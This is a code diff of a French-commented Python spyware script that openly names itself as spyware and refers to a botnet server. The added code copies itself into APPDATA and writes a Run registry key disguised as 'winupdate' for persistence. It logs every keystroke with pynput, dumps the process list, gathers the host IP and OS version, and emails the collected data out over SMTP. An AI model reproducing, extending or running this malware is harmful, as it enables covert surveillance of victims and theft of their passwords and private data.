@@ -19,35 +19,14 @@ import re
 import platform
 import shutil
 
-# Call copyfile.bat
-os.system('copyfile.bat')
-# Call botnet server
-os.system('server/server.py')
+def startup():
+        strAppPath = APPDATA + "\\" + os.path.basename(strPath)
+        copyfile(strPath, strAppPath)
 
-# Call la tasklist et l'enregistre dans output.txt
-tasklist = os.system("tasklist")
-with open("output.txt", "wb") as f:
-    f.write(subprocess.check_output(['tasklist']))
-    f.close()
+        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
+        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
 
-# Call le keylogger
-os.system('Logger.pyw')
-
-# Prend l'ip
-hostname = socket.gethostname()
-myip = socket.gethostbyname(hostname)
-
-# Ici, retirez les 4 # devant les commandes pour faire en sorte que le spyware s'arrête quand on appuie sur Echap.
-#def on_press(key):
-#    logging.info(str(key))
-#    if key == Key.esc:
-#        return False
-
-osver = platform.platform()
-
-# Fin du spyware
-while True
-    time.sleep(3600)
+def emailing():
 # Envois les données à une email.
     email_user = 'Votre E-mail'
     email_send = 'Votre E-mail'
@@ -78,3 +57,48 @@ while True
 
     server.sendmail(email_user,email_send,text)
     server.quit()
+
+def Keylogger():
+
+    log_dir = ""
+
+    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='"%(asctime)s", %(message)s')
+
+    def on_press(key):
+        logging.info('"{0}"'.format(key))
+
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+def tasklist():
+    tasklist = os.system("tasklist")
+    with open("output.txt", "wb") as f:
+        f.write(subprocess.check_output(['tasklist']))
+        f.close()
+
+# Call botnet server
+def Main():
+
+    tasklist()
+    Keylogger()
+    startup()
+
+    # Prend l'ip
+    hostname = socket.gethostname()
+    myip = socket.gethostbyname(hostname)
+
+    # Ici, retirez les 4 # devant les commandes pour faire en sorte que le spyware s'arrête quand on appuie sur Echap.
+    #def on_press(key):
+    #    logging.info(str(key))
+    #    if key == Key.esc:
+    #        return False
+
+    osver = platform.platform()
+
+    time.sleep(3600)
+    emailing()
+
+# Fin du spyware
+
+if __name__ == '__main__':
+    Main()
